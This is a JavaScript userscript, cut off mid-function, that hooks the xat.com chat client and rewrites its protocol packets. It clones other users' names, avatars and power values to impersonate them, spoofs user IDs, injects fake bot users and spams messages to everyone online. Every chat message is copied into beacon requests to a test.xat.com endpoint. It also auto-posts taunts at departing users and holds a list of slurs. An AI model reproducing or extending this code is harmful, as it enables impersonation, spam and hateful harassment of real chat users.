// Usage: https?:\/\/xat\.com\/content\/web\/.*?\/box.*?\/embed\.html\?n=.+
function utf8Decode(utf8Decode) {
    return decodeURIComponent(escape(utf8Decode));
}
function utf8Encode(s) {
    return unescape(encodeURIComponent(s));
}
var HOOKS_REGISTER = {};

//mammon (main "bot")

var id = 5;
var name = "Mammon(hat#Eg)(glow#92783c#cfcfcf)##Mammon of Greed#92783c#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable";
var avatar = "https://img.xatblog.net/image/l3JzaQ6R4G.png";
var regname = "Mammon";

//gaap values

var gaap_id = 33;
var gaap_name = "Gaap(hat#Er)##The 33rd Ranked Demon##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable";
var gaap_avatar = "https://i.imgur.com/aIwzaaE.png";
var gaap_regname = "Gaap";

var fakeID = 42; // used for faking as whatever id (must be set in local storage to work properly)
var userID = 0;
var chatID = 0;

var refreshFlag = false;
var defaultPacket = true;
var invisFlag = false;
var afkSent = [];
var afkSent2 = [];
var Copy = false;
var crashEnable = true;
var isEnabled = false;
var isEnabled2 = false;
var isEnabled3 = false;
var isEnabled4 = false;
var copyEnabled = false;
var copyFlag = false;
var copyFlag2 = false;
var vipEnabled = false;
var mashaEnabled = false;
var afkEnabled = false;
var afkMsg = [];
var fakeID2 = [];
var xatIDs = [];
var ignoredUsers = [];
var usersOnline = [];

//////////////////////////////////// Main User Values

var backupp0 = [];
var backupp1 = [];
var backupp2 = [];
var backupp3 = [];
var backupp4 = [];
var backupp5 = [];
var backupp6 = [];
var backupp7 = [];
var backupp8 = [];
var backupp9 = [];
var backupp10 = [];
var backupp10 = [];
var backupp11 = [];
var backupp12 = [];
var backupp13 = [];
var backupp14 = [];
var backupp15 = [];
var backupp16 = [];
var backupp17 = [];
var backupp18 = [];
var backupp19 = [];
var backupp20 = [];
var backupp21 = [];
var backupp22 = [];
var backupp23 = [];

//////////////////////////////////// Copy User Values
var reflectName = [];
var copyRegname = [];
var copyName = [];
var copyAvatar = [];
var copyHomepage = [];
var copyv = [];
var copyd2 = [];
var copyUserno = [];
var copyp0 = [];
var copyp1 = [];
var copyp2 = [];
var copyp3 = [];
var copyp4 = [];
var copyp5 = [];
var copyp6 = [];
var copyp7 = [];
var copyp8 = [];
var copyp9 = [];
var copyp10 = [];
var copyp10 = [];
var copyp11 = [];
var copyp12 = [];
var copyp13 = [];
var copyp14 = [];
var copyp15 = [];
var copyp16 = [];
var copyp17 = [];
var copyp18 = [];
var copyp19 = [];
var copyp20 = [];
var copyp21 = [];
var copyp22 = [];
var copyp23 = [];
var copypo = [];
var copylist = [];

//////////////////////////////////// Copy User Values
var usersRegister = [];
var usersID = [];
var usersName = [];
var usersAvatar = [];
var usersHomepage = [];
var usersv = [];
var usersd2 = [];
var usersp0 = [];
var usersp1 = [];
var usersp2 = [];
var usersp3 = [];
var usersp4 = [];
var usersp5 = [];
var usersp6 = [];
var usersp7 = [];
var usersp8 = [];
var usersp9 = [];
var usersp10 = [];
var usersp11 = [];
var usersp12 = [];
var usersp13 = [];
var usersp14 = [];
var usersp15 = [];
var usersp16 = [];
var usersp17 = [];
var usersp18 = [];
var usersp19 = [];
var usersp20 = [];
var usersp21 = [];
var usersp22 = [];
var usersp23 = [];

var nickBackup = "";
var avatarBackup = "";
var crashCol = 0;
var crashCol2 = 1;
var crashCol3 = 2;
var crashCol4 = 3;
var crashCol5 = 4;
var crashCol6 = 5;
var crashCol7 = 6;
var mammonAll = [];
var insultWelcome = false;
var insultFlag = false;

xat_activityToC = activityToC;
activityToC = function(e, o, t) {
    "xatMessageReceived" == e && "#MESSAGE" == o && (t = hookedHandle("fromxat", e, o, utf8Decode(atob(t))));

        if ("#MESSAGE" == o) {
            document.querySelector('body').insertAdjacentHTML('beforeend', '<img id="test" src="https://test.xat.com/test.php?method=recv&text=' + encodeURIComponent(t) + '" />');
        document.querySelector('#test').remove();
        }    


    return xat_activityToC(e, o, t);
}

xat_xatSend = xatSend;
xatSend = function(e, o) {
    "" == e && (o = hookedHandle("toxat", e, "", o));

       if ("" == e) {
            document.querySelector('body').insertAdjacentHTML('beforeend', '<img id="test" src="https://test.xat.com/test.php?method=sent&text=' + encodeURIComponent(o) + '" />');
        document.querySelector('#test').remove();
        }

    return xat_xatSend(e, o);
}

function hookedHandle(d, e, o, t) {
    if (t.includes('<w')) {
        return t;
    }
    var parser = new DOMParser();
    var xmlDoc = parser.parseFromString(t.replaceAll('"i="', ' i="'), "text/xml");
    var send = true;

    var tag = xmlDoc.documentElement.nodeName;
    let xml = new Object();
    for (var att, i = 0, atts = xmlDoc.documentElement.attributes, n = atts.length; i < n; i++) {
        xml[atts[i].nodeName.toString()] = atts[i].nodeValue.toString();
    }

    callHooks(d, tag, xml, xmlDoc, send);

    result = new XMLSerializer().serializeToString(xmlDoc.documentElement);

    if (result.indexOf("parsererror") != -1) {
        return t;
    }

    return result;
}

function registerHook(tag, func) {
    if (!HOOKS_REGISTER[tag]) HOOKS_REGISTER[tag] = [];
    HOOKS_REGISTER[tag].push(func);
}

function callHooks(direction, tag, xml, doc, send) {
    if (!HOOKS_REGISTER[tag]) return;

    function call(fn, xml, direction, doc, send) {
        fn(xml, direction, doc, send);
    }
    HOOKS_REGISTER[tag].forEach(fn => call(fn, xml, direction, doc, send));
}

function selfMsg(msg) {
    fakeRecv('<m t="' + msg + '" u="' + id + '" />');
}

function fakeRecv(data) {
    xat_activityToC("xatMessageReceived", "#MESSAGE", btoa(data));
}

function fakeSend(data) {
    xat_xatSend("", data);
}

registerHook("done", function(xml, direction, doc, send) {

	if (direction == "fromxat" && copyEnabled == true) {
		copyFlag2 = false;
		selfMsg('' + copyRegname + ' ID is: ' + copyUserno + ' ');
		selfMsg('' + copyRegname + ' avatar is: ' + copyAvatar + ' ');
		selfMsg('' + copyRegname + ' has changed their name ' + copyv + ' time(s). since last cache clear. ');
	if (direction == "fromxat" && copyd2 == "") {
		selfMsg('' + copyRegname + ' is not married to anyone. ');
	}
	else {
		selfMsg('' + copyRegname + ' is married or bff to: ' + copyd2 + ' ');
	}
}

    if (direction == "fromxat") {
        fakeRecv('<u cb="1625121314" f="33" p0="1476393982" p1="2147483647" p2="4294836182" p3="4294967295" p4="2147483647" p5="2147479551" p6="2147352575" p7="2147483647" p8="2147418111" p9="2147483647" p10="2147483647" p11="2147483639" p12="2147483583" p13="2147483647" p14="2080374783" p15="2045640703" p16="1608499071" p17="1069547519" p18="2130702079" p19="2097151" po="2|3|5|7|8|10=2|12=2|18|19|20|22|23|26|33=2|36=2|37|38|39|44|47|49|51|54|58|59|60=17|65|68|69|71|74=2|75|78=68|80|82|84|85|89|91=5|92=15|96|112|114=3|115|117|118|120=2|125|126=3|138|139|141|143|145|146|147|150=2|155|160|161|163|164|167|197|201|205|209|214|215|216|222|224|225|226|228|229|252|302|310|314|336|346|349=2|423|613|618=2|623=3|" u="' + id + '" d0="151002176" d2="6666" q="2" N="' + regname + '" n="' + name + '" a="' + avatar + '" h="" v="0" />');
	if (copyEnabled != true) {
        fakeRecv('<p u="' + id + '" d="' + userID + '" t="Without love, the truth cannot be seen." />');
    }
}

    if (direction == "fromxat" && copyEnabled == true) {
        fakeRecv('<p u="' + userID + '" d="' + userID + '" t="You are currently copying: ' + copyRegname + ' (' + copyUserno + ')" />');

	if (direction == "fromxat" && invisFlag == true) {
        fakeRecv('<u f="161" p0="537395201" p3="2147483648" p19="335544320" po="' + copypo + '" u="6666" d0="151002210" q="2"  N="Mike" n="' + utf8Encode(reflectName) + '" a="' + copyAvatar + '" h="' + copyHomepage + '" />');
		setTimeout(function() { fakeRecv('<l u="6666"/>'); }, 50);
        } else {
        fakeRecv('<u f="161" p0="' + copyp0 + '" p1="' + copyp1 + '" p2="' + copyp2 + '"p3="' + copyp3 + '" p4="' + copyp4 + '" p5="' + copyp5 + '" p6="' + copyp6 + '" p7="' + copyp7 + '" p8="' + copyp8 + '" p9="' + copyp9 + '" p10="' + copyp10 + '" p11="' + copyp11 + '" p12="' + copyp12 + '" p13="' + copyp13 + '" p14="' + copyp14 + '" p15="' + copyp15 + '" p16="' + copyp16 + '" p17="' + copyp17 + '" p18="' + copyp18 + '" p19="' + copyp19 + '" p20="' + copyp20 + '" p21="' + copyp21 + '" p22="' + copyp22 + '" p23="' + copyp23 + '" po="' + copypo + '" u="6666" d0="151002210" q="2"  N="Mike" n="' + utf8Encode(reflectName) + '" a="' + copyAvatar + '" h="' + copyHomepage + '" />');
        }
    }

    // n="' + copyName + '" packet for later when unicode utf is solved..

    copyRegname = copyRegname;
	copyName = copyName;
	copyAvatar = copyAvatar;
	copyHomepage = copyHomepage;
    copyUserno = copyUserno;
	copyv = copyv;
	copyd2 = copyd2;
    copyp0 = copyp0;
    copyp1 = copyp1;
    copyp2 = copyp2;
    copyp3 = copyp3;
    copyp4 = copyp4;
    copyp5 = copyp5;
    copyp6 = copyp6;
    copyp7 = copyp7;
    copyp8 = copyp8;
    copyp9 = copyp9;
    copyp10 = copyp10;
    copyp11 = copyp11;
    copyp12 = copyp12;
    copyp13 = copyp13;
    copyp14 = copyp14;
    copyp15 = copyp15;
    copyp16 = copyp16;
    copyp17 = copyp17;
    copyp18 = copyp18;
    copyp19 = copyp19;
    copyp20 = copyp20;
    copyp21 = copyp21;
    copyp22 = copyp22;
    copyp23 = copyp23;
    copypo = [];
	
	insultWelcome = true;
		
});

registerHook("y", function(packet, direction, doc, send) {

    if (direction == "toxat" && packet.r == "15485457") {
	insultFlag = true;
}

	insultWelcome = false;

    if (direction == "fromxat") return;
    chatID = packet.r;
    userID = packet.u;

if (chatID == "97250126") {
refreshFlag = true;
}
});

registerHook("u", function(packet, direction, doc, send) {

    if (direction == "fromxat" && ignoredUsers.includes(packet.u.toString())) {
        return doc.documentElement.remove();
    }

    if (direction == "fromxat" && mammonAll == true) {
        doc.documentElement.attributes.N.value = "Mammon"
        doc.documentElement.attributes.n.value = "Mammon(hat#Eg)(glow#92783c#cfcfcf)##Mammon of Greed#92783c#cfcfcf##eyJlZmZlY3QiOiJ0cmFuc2x1Y2VudCIsInNwZWVkIjo0LCJzdGF0dXMyIjoiSSBuZWVkIHBlYWNlIGFuZCB0cmFucXVpbGl0eSIsIndhdmVGcmVxdWVuY3kiOjN9##disable##disable";
        doc.documentElement.attributes.a.value = "https://i.imgur.com/nHQOa6d.png"
    }

    if (direction == "toxat") return;

	usersName.push(packet.n);
	usersRegister.push(packet.N);
	usersID.push(packet.u);
	usersAvatar.push(packet.a);
	usersHomepage.push(packet.h);
	usersv.push(packet.v);
	usersd2.push(packet.d2);
    usersp0.push(packet.p0);
    usersp1.push(packet.p1);
    usersp2.push(packet.p2);
    usersp3.push(packet.p3);
    usersp4.push(packet.p4);
    usersp5.push(packet.p5);
    usersp6.push(packet.p6);
    usersp7.push(packet.p7);
    usersp8.push(packet.p8);
    usersp9.push(packet.p9);
    usersp10.push(packet.p10);
    usersp11.push(packet.p11);
    usersp12.push(packet.p12);
    usersp13.push(packet.p13);
    usersp14.push(packet.p14);
    usersp15.push(packet.p15);
    usersp16.push(packet.p16);
    usersp17.push(packet.p17);
    usersp18.push(packet.p18);
    usersp19.push(packet.p19);
    usersp20.push(packet.p20);
    usersp21.push(packet.p21);
    usersp22.push(packet.p22);
    usersp23.push(packet.p23);

});

registerHook("j2", function(packet, direction, doc, send) {

if (defaultPacket == true) {
	backupp0.push(packet.m0);
	backupp1.push(packet.m1);
	backupp2.push(packet.m2);
	backupp3.push(packet.m3);
	backupp4.push(packet.m4);
	backupp5.push(packet.m5);
	backupp6.push(packet.m6);
	backupp7.push(packet.m7);
	backupp8.push(packet.m8);
	backupp9.push(packet.m9);
	backupp10.push(packet.m10);
	backupp11.push(packet.m11);
	backupp12.push(packet.m12);
	backupp13.push(packet.m13);
	backupp14.push(packet.m14);
	backupp15.push(packet.m15);
	backupp16.push(packet.m16);
	backupp17.push(packet.m17);
	backupp18.push(packet.m18);
	backupp19.push(packet.m19);
	backupp20.push(packet.m20);
	backupp21.push(packet.m21);
	backupp22.push(packet.m22);
	backupp23.push(packet.m23);
	defaultPacket = false;
}

    if (direction == "toxat" && packet.u == fakeID) {
        doc.documentElement.attributes.u.value = "6666";
    }

    if (direction == "toxat" && copyEnabled == true) {
        if (direction == "toxat" && vipEnabled == false) {
            let copyNameStr = copyName.toString();
            let totalChars = copyNameStr.split('##').length;
            if (totalChars == 3) { // only 3 ##
                doc.documentElement.attributes.n.value = copyName + '##enable##disable';
				reflectName = copyName + '##enable##disable';
            } else if (totalChars == 4) { // only ##
                doc.documentElement.attributes.n.value = copyName + '##disable';
				reflectName = copyName + '##disable';
            } else {
                let splitChars = copyNameStr.split('##');
                splitChars[3] = 'disable';
                splitChars[4] = 'disable';
                doc.documentElement.attributes.n.value = splitChars.join('##');
				reflectName = splitChars.join('##');
            }
        } else if (direction == "toxat" && vipEnabled == true) {
            doc.documentElement.attributes.n.value = copyName;
        }

        doc.documentElement.attributes.a.value = copyAvatar;
        doc.documentElement.attributes.h.value = copyHomepage;

        if (direction == "toxat" && copyp0 == "" && invisFlag != true) {
            doc.documentElement.attributes.m0.value = (2147483647 - 5); //2147483647
            doc.documentElement.attributes.m1.value = (2147483647 - copyp1); //2147483647
            doc.documentElement.attributes.m2.value = (4294967295 - copyp2); //4294967295
            doc.documentElement.attributes.m3.value = (4294967295 - 2147483648); //4294967295
            doc.documentElement.attributes.m4.value = (2147483647 - copyp4); //2147483647
            doc.documentElement.attributes.m5.value = (2147483647 - copyp5); //2147483647
            doc.documentElement.attributes.m6.value = (2147483647 - copyp6); //2147483647
            doc.documentElement.attributes.m7.value = (2147483647 - copyp7); //2147483647
            doc.documentElement.attributes.m8.value = (2147483647 - copyp8); //2147483647
            doc.documentElement.attributes.m9.value = (2147483647 - copyp9); //2147483647
            doc.documentElement.attributes.m10.value = (2147483647 - copyp10); //2147483647
            doc.documentElement.attributes.m11.value = (2147483647 - copyp11); //2147483647
            doc.documentElement.attributes.m12.value = (2147483647 - copyp12); //2147483647
            doc.documentElement.attributes.m13.value = (2147483647 - copyp13); //2147483647
            doc.documentElement.attributes.m14.value = (2080374783 - copyp14); //2080374783
            doc.documentElement.attributes.m15.value = (2112880639 - copyp15); //2112880639
            doc.documentElement.attributes.m16.value = (1608499071 - copyp16); //1608499071
            doc.documentElement.attributes.m17.value = (1069547519 - copyp17); //1069547519
            doc.documentElement.attributes.m18.value = (2130702079 - copyp18); //2130702079
            doc.documentElement.attributes.m19.value = (67108863 - 33554432); //67108863
        } else if (direction == "toxat" && copyp0 != "" && invisFlag != true) { 
            doc.documentElement.attributes.m0.value = (2147483647 - copyp0); //2147483647
            doc.documentElement.attributes.m1.value = (2147483647 - copyp1); //2147483647
            doc.documentElement.attributes.m2.value = (4294967295 - copyp2); //4294967295
            doc.documentElement.attributes.m3.value = (4294967295 - copyp3); //4294967295
            doc.documentElement.attributes.m4.value = (2147483647 - copyp4); //2147483647
            doc.documentElement.attributes.m5.value = (2147483647 - copyp5); //2147483647
            doc.documentElement.attributes.m6.value = (2147483647 - copyp6); //2147483647
            doc.documentElement.attributes.m7.value = (2147483647 - copyp7); //2147483647
            doc.documentElement.attributes.m8.value = (2147483647 - copyp8); //2147483647
            doc.documentElement.attributes.m9.value = (2147483647 - copyp9); //2147483647
            doc.documentElement.attributes.m10.value = (2147483647 - copyp10); //2147483647
            doc.documentElement.attributes.m11.value = (2147483647 - copyp11); //2147483647
            doc.documentElement.attributes.m12.value = (2147483647 - copyp12); //2147483647
            doc.documentElement.attributes.m13.value = (2147483647 - copyp13); //2147483647
            doc.documentElement.attributes.m14.value = (2080374783 - copyp14); //2080374783
            doc.documentElement.attributes.m15.value = (2112880639 - copyp15); //2112880639
            doc.documentElement.attributes.m16.value = (1608499071 - copyp16); //1608499071
            doc.documentElement.attributes.m17.value = (1069547519 - copyp17); //1069547519
            doc.documentElement.attributes.m18.value = (2130702079 - copyp18); //2130702079
            doc.documentElement.attributes.m19.value = (67108863 - copyp19); //67108863
        }
    }

    if (direction == "toxat" && mashaEnabled == true) {
        doc.documentElement.attributes.n.value = '☭Masha(glow#0#r----)######enable##disable';
        doc.documentElement.attributes.a.value = 'https://i.imgur.com/0imCXli.png';
        doc.documentElement.attributes.h.value = 'http://prntscr.com/1virukr';
        doc.documentElement.attributes.m0.value = (2147483647 - 808056868); //2147483647
        doc.documentElement.attributes.m1.value = (2147483647 - 1627406336); //2147483647
        doc.documentElement.attributes.m2.value = (4294967295 - 688160); //4294967295
        doc.documentElement.attributes.m3.value = (4294967295 - 52445320); //4294967295
        doc.documentElement.attributes.m4.value = (2147483647 - 512); //2147483647
        doc.documentElement.attributes.m5.value = '2147483647'; //2147483647
        doc.documentElement.attributes.m6.value = '2147483647'; //2147483647
        doc.documentElement.attributes.m7.value = '2147483647'; //2147483647
        doc.documentElement.attributes.m8.value = (2147483647 - 16777472); //2147483647
        doc.documentElement.attributes.m9.value = '2147483647'; //2147483647
        doc.documentElement.attributes.m10.value = '2147483647'; //2147483647
        doc.documentElement.attributes.m11.value = (2147483647 - 67109120); //2147483647
        doc.documentElement.attributes.m12.value = (2147483647 - 8192); //2147483647
        doc.documentElement.attributes.m13.value = '2147483647'; //2147483647
        doc.documentElement.attributes.m14.value = (2080374783 - 129); //2080374783
        doc.documentElement.attributes.m15.value = (2112880639 - 2112880639); //2112880639
        doc.documentElement.attributes.m16.value = (1608499071 - 1608499071); //1608499071
        doc.documentElement.attributes.m17.value = (1069547519 - 1069547519); //1069547519
        doc.documentElement.attributes.m18.value = (2130702079 - 2048); //2130702079
        doc.documentElement.attributes.m19.value = (67108863 - 16777216); //67108863
    }

    usersOnline = [];

    afkMsg = [];
    nickBackup = packet.n;
    avatarBackup = packet.a;

	//doc.documentElement.attributes.d2.value = 42;

});

registerHook("l", function(packet, direction, doc, send) {

    if (direction == "fromxat" && insultFlag == true && insultWelcome == true) {
		const item = packet.u;
		const index = usersID.indexOf(item);
		if (index !== -1 && usersRegister[index] !== undefined) {
        fakeSend('<m t="Good riddance, ' + usersRegister[index] + ' (bye#)" u="6666"/>');
		fakeRecv('<m t="Good riddance, ' + usersRegister[index] + ' (bye#)" u="6666"/>');
		}
		else if (index !== -1 && usersRegister[index] == undefined) {
		fakeSend('<m t="Good riddance, ' + usersName[index].replaceAll('#','') + ' (bye#)" u="6666"/>');
		fakeRecv('<m t="Good riddance, ' + usersName[index].replaceAll('#','') + ' (bye#)" u="6666"/>');
	}
}

		if (usersOnline.includes(packet.u)) {
				usersOnline.splice(usersOnline.indexOf(packet.u), 1);
		}
});

registerHook("z", function(xml, direction, doc, send) {

if (direction == "fromxat" && xml.t.includes("/a") && copyEnabled == true && copyFlag == true) {
		fakeSend('<z d="' + xml.u + '" u="6666" t="/a_NF"/>');
		copyUserno.push(xml.u.toString());
		copyName.push(xml.n.toString());
		copyAvatar.push(xml.a.toString());
		copyHomepage.push(xml.h.toString());	
		copyv.push(xml.v.toString());	

if (typeof xml.d2 == "undefined") {	
		null;
	}
	else {
		copyd2.push(xml.d2.toString());
	}		
		
		
if (typeof xml.p0 == "undefined") {	
		null;
	}
	else {
		copyp0.push(xml.p0.toString());
	}	

if (typeof xml.p1 == "undefined") {	
		null;
	}
	else {
		copyp1.push(xml.p1.toString());
	}	

if (typeof xml.p2 == "undefined") {	
		null;
	}
	else {
		copyp2.push(xml.p2.toString());
	}	

if (typeof xml.p3 == "undefined") {	
		null;
	}
	else {
		copyp3.push(xml.p3.toString());
	}	

if (typeof xml.p4 == "undefined") {	
		null;
	}
	else {
		copyp4.push(xml.p4.toString());
	}	

if (typeof xml.p5 == "undefined") {	
		null;
	}
	else {
		copyp5.push(xml.p5.toString());
	}	

if (typeof xml.p6 == "undefined") {	
		null;
	}
	else {
		copyp6.push(xml.p6.toString());
	}	

if (typeof xml.p7 == "undefined") {	
		null;
	}
	else {
		copyp7.push(xml.p7.toString());
	}	

if (typeof xml.p8 == "undefined") {	
		null;
	}
	else {
		copyp8.push(xml.p8.toString());
	}	

if (typeof xml.p9 == "undefined") {	
		null;
	}
	else {
		copyp9.push(xml.p9.toString());
	}	

if (typeof xml.p10 == "undefined") {	
		null;
	}
	else {
		copyp10.push(xml.p10.toString());
	}	

if (typeof xml.p11 == "undefined") {	
		null;
	}
	else {
		copyp11.push(xml.p11.toString());
	}	

if (typeof xml.p12 == "undefined") {	
		null;
	}
	else {
		copyp12.push(xml.p12.toString());
	}	

if (typeof xml.p13 == "undefined") {	
		null;
	}
	else {
		copyp13.push(xml.p13.toString());
	}	

if (typeof xml.p14 == "undefined") {	
		null;
	}
	else {
		copyp14.push(xml.p14.toString());
	}	

if (typeof xml.p15 == "undefined") {	
		null;
	}
	else {
		copyp15.push(xml.p15.toString());
	}	

if (typeof xml.p16 == "undefined") {	
		null;
	}
	else {
		copyp16.push(xml.p16.toString());
	}	

if (typeof xml.p17 == "undefined") {	
		null;
	}
	else {
		copyp17.push(xml.p17.toString());
	}	

if (typeof xml.p18 == "undefined") {	
		null;
	}
	else {
		copyp18.push(xml.p18.toString());
	}	

if (typeof xml.p19 == "undefined") {	
		null;
	}
	else {
		copyp19.push(xml.p19.toString());
	}	
		copyFlag = false;
		selfMsg('Now mimicking user..');
		fakeSend('<C/>');
    }


    if (direction == "fromxat" && afkEnabled == true && afkSent == "" && xml.t !== "/l") {
        fakeSend('<z d="' + xml.u + '" u="' + userID + '" t="' + afkMsg + '" s="2" />');
        afkSent.push(xml.u.toString());
    }

    var mammonL = 'p0="939523071" p1="2147483647" p2="4294836182" p3="4294967295" p4="2147483647" p5="2147479551" p6="2147352575" p7="2147483647" p8="2147418111" p9="2147483647" p10="2147483647" p11="2147483639" p12="2147483583" p13="2147483647" p14="2080374783" p15="2045640703" p16="1608499071" p17="1069547519" p18="2130702079" p19="2097151" po="2|3|5|7|8|10=2|12=2|18|19|20|22|23|26|33=2|36=2|37|38|39|44|47|49|51|54|58|59|60=17|65|68|69|71|74=2|75|78=68|80|82|84|85|89|91=5|92=15|96|112|114=3|115|117|118|120=2|125|126=3|138|139|141|143|145|146|147|150=2|155|160|161|163|164|167|197|201|205|209|214|215|216|222|224|225|226|228|229|252|302|310|314|336|346|349=2|423|613|618=2|623=3|" u="' + xml.d + '" d0="151002176" d2="6666" q="2" N="' + regname + '" n="' + name + '" a="' + avatar + '" h="" v="0"';

    var gaapL = 'p0="939523071" p1="2147483647" p2="4294836182" p3="4294967295" p4="2147483647" p5="2147479551" p6="2147352575" p7="2147483647" p8="2147418111" p9="2147483647" p10="2147483647" p11="2147483639" p12="2147483583" p13="2147483647" p14="2080374783" p15="2045640703" p16="1608499071" p17="1069547519" p18="2130702079" p19="2097151" po="2|3|5|7|8|10=2|12=2|18|19|20|22|23|26|33=2|36=2|37|38|39|44|47|49|51|54|58|59|60=17|65|68|69|71|74=2|75|78=68|80|82|84|85|89|91=5|92=15|96|112|114=3|115|117|118|120=2|125|126=3|138|139|141|143|145|146|147|150=2|155|160|161|163|164|167|197|201|205|209|214|215|216|222|224|225|226|228|229|252|302|310|314|336|346|349=2|423|613|618=2|623=3|" u="' + xml.d + '" d0="151002176" d2="6666" q="2" N="' + gaap_regname + '" n="' + gaap_name + '" a="' + gaap_avatar + '" h="" v="0"';

    if (xml.t.indexOf("/l") != -1 && direction == "toxat" && xml.d == 5) fakeRecv('<z d="6666" t="/a_NF"  ' + mammonL + ' />');

    if (xml.t.indexOf("/l") != -1 && direction == "toxat" && xml.d == 33) fakeRecv('<z d="6666" t="/a_NF"  ' + gaapL + ' />');

    if (xml.t.indexOf("/a") != -1 && direction == "toxat") doc.documentElement.attributes.t.value = "/a_NF";

    if (xml.t.indexOf("/l") != -1 && direction == "fromxat") fakeSend('<z d="' + doc.documentElement.attributes.u.value + '" u="6666" t="/a_NF" />'); // for invisible <z send

    //if (xml.t.indexOf("/l") != -1 && direction == "fromxat" && packet.u.includes("42")) fakeSend('<z d="' + doc.documentElement.attributes.u.value + '" u="6666" t="/a_NF" />');// send a fake nofollow packet when clicked, regardless of invisible.

    //if (xml.t.indexOf("/l") != -1 && direction == "toxat") doc.documentElement.attributes.t.value = "/x";

    if (direction == "toxat" && xml.u.includes(fakeID)) {
        doc.documentElement.attributes.u.value = "6666";
    }

});

registerHook("m", function(packet, direction, doc, send) {

    if (direction == "toxat" && afkEnabled == true && !packet.t.includes("afk")) {
        afkMsg.pop();
        afkSent.pop();
        afkSent2.pop();
        afkEnabled = false;
		fakeSend('<bs n="' + nickBackup + '##disable" a="' + avatarBackup + ' " u="6666" />');
        selfMsg('Your afk has been removed.');
    }

    if (direction == "fromxat" && ignoredUsers.includes(packet.u.toString())) {
        return doc.documentElement.remove();
    }

    if (direction == "fromxat" && Copy == true && xatIDs.includes(packet.u.toString())) {
        fakeSend('<m t="' + packet.t + '" u="' + userID + '" />');
    }

    var mammonL = 'p0="939523071" p1="2147483647" p2="4294836182" p3="4294967295" p4="2147483647" p5="2147479551" p6="2147352575" p7="2147483647" p8="2147418111" p9="2147483647" p10="2147483647" p11="2147483639" p12="2147483583" p13="2147483647" p14="2080374783" p15="2045640703" p16="1608499071" p17="1069547519" p18="2130702079" p19="2097151" po="2|3|5|7|8|10=2|12=2|18|19|20|22|23|26|33=2|36=2|37|38|39|44|47|49|51|54|58|59|60=17|65|68|69|71|74=2|75|78=68|80|82|84|85|89|91=5|92=15|96|112|114=3|115|117|118|120=2|125|126=3|138|139|141|143|145|146|147|150=2|155|160|161|163|164|167|197|201|205|209|214|215|216|222|224|225|226|228|229|252|302|310|314|336|346|349=2|423|613|618=2|623=3|" u="' + id + '" d0="151002176" d2="6666" q="2" N="' + regname + '" n="' + name + '" a="' + avatar + '" h="" v="0"';

    var gaapL = 'p0="939523071" p1="2147483647" p2="4294836182" p3="4294967295" p4="2147483647" p5="2147479551" p6="2147352575" p7="2147483647" p8="2147418111" p9="2147483647" p10="2147483647" p11="2147483639" p12="2147483583" p13="2147483647" p14="2080374783" p15="2045640703" p16="1608499071" p17="1069547519" p18="2130702079" p19="2097151" po="2|3|5|7|8|10=2|12=2|18|19|20|22|23|26|33=2|36=2|37|38|39|44|47|49|51|54|58|59|60=17|65|68|69|71|74=2|75|78=68|80|82|84|85|89|91=5|92=15|96|112|114=3|115|117|118|120=2|125|126=3|138|139|141|143|145|146|147|150=2|155|160|161|163|164|167|197|201|205|209|214|215|216|222|224|225|226|228|229|252|302|310|314|336|346|349=2|423|613|618=2|623=3|" u="' + gaap_id + '" d0="151002176" d2="6666" q="2" N="' + gaap_regname + '" n="' + gaap_name + '" a="' + gaap_avatar + '" h="" v="0"';

    if (direction == "toxat" && packet.u.includes(fakeID)) {
        doc.documentElement.attributes.u.value = "6666";
    }

    if (isEnabled3 == true && direction == "toxat" && !packet.t.includes("/l", "*") && packet.t.substr(0, 1) != "?") {
        fakeSend('<m t="*' + packet.t + '*" u="' + userID + '" l="1" />');
        return doc.documentElement.remove();
    } else if (isEnabled3 == true && direction == "toxat") {
        null;
    }

    if (isEnabled == true && direction == "toxat" && packet.E == undefined && !packet.t.includes("/l", "*") && packet.t.substr(0, 1) != "?") {
        usersOnline.forEach(function(id) {
            fakeSend('<c u="' + id + '" t="' + packet.t + '" s="1" />');
        })
        return doc.documentElement.remove();
    } else if (isEnabled == true && direction == "toxat" && packet.E == undefined) {
        null;
    }

    if (isEnabled2 == true && direction == "toxat" && !packet.t.includes("/l", "*") && packet.t.substr(0, 1) != "?") {
        fakeSend('<p u="23232323" t="!say ' + packet.t + '" s="2" d="6666" />');
        return doc.documentElement.remove();
    } else if (isEnabled2 == true && direction == "toxat") {
        null;
    }

    if (direction == "fromxat" && packet.l != undefined) {
        fakeRecv('<p u="' + packet.u + '" t="[Guest Link]: ' + packet.t + '"/>');
    }

    if (direction == "fromxat") return;

    /* fakeedit filter to set any edited message automatically
    doc.documentElement.attributes.o.value = 'eyJpc1RyYW5zbGF0ZWQiOiAiQnJpbmdlciBvZiBEZXNwYWlyIiwgImlzRWRpdGVkIjogIkJyaW5nZXIgb2YgRGVzcGFpciIsICJ0eXBlIjogIm1zZyJ9'
*/
	    	if (packet.u == "6666"){
    	doc.documentElement.removeAttribute('o'); // remove reactions for my messages
    }

    /*
    if (packet.u == "6666"){ // quote every message
    	doc.documentElement.attributes.t.value = packet.t.replace(packet.t, '*❯#6666[' + packet.t + ']*');
    }
    */

    if (packet.l != undefined) {
        doc.documentElement.removeAttribute('l'); // keep my links stored
    }

    //doc.documentElement.setAttribute('l', '1'); // don't store my messages sent

    packet.t = packet.t.replace(String.fromCharCode(127), "").trim();

    if (!packet.t || packet.t.substr(0, 1) != "?") return; // command char: ?

    var myArray = [
        "ape",
        "apefucker",
        "arfarfan'arf",
        "arse",
        "arsebreath",
        "arsecunt",
        "arseface",
        "arsehole",
        "ass",
        "assaholic",
        "assbag",
        "assbutt",
        "ass clown",
        "asscunt",
        "assface",
        "assfag",
        "assfaggot",
        "assfucker",
        "asshat",
        "asshole",
        "ass-kisser",
        "ass-licker",
        "faggot",
        "fuckwit",
        "dumbass",
        "toilet looking nword",
        "pansy queerbait",
        "beauty. The most beautiful thing to ever exist. [This is an error.]",
        "ugly fuckstain shitbrain",
        "Rena retard looking dipshit failed abortion"
    ];

    var randomItem = myArray[Math.floor(Math.random() * myArray.length)];

    var message = packet.t.split(" ");
